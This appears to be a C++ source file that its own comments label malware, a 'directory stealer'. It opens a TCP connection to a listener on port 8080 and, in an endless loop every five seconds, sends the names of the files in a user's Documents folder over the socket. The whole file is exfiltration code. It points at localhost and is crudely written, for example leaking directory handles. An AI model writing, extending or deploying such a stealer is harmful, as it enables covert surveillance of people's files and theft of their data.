#include <iostream>

// Network aspect of malware
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

// Directory stealer 
#include <dirent.h>

// File Opener
#include <sys/stat.h>
#include <fcntl.h>

using namespace std;

void client();
string getDirectory();

int main() {
	client();	
}

void client() {
	int sockfd, port = 8080;
	struct sockaddr_in serv_addr;

	char directory[1024];
	struct dirent *ent;
	DIR *dir;
	dir = opendir("/home/none/Documents/");

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		cout << "Client: Could not create socket" << endl;
		exit(1);
	}
	
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	inet_aton("127.0.0.1", &(serv_addr.sin_addr));

	if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == -1) {
		cout << "Client: Could not connect socket" << endl;
		exit(1);
	}

	while (1) {
		dir = opendir("/home/none/Documents/");
		while ( (ent = readdir(dir)) != NULL) {
			strcpy(directory, ent->d_name);
			
			if ( write(sockfd, directory, 1024) == -1 ) {
				cout << "Client: Could not write" << endl;
				exit(1);
			}	
		}
		sleep(5);

	}
	
	close(sockfd);
	return;	
	
}


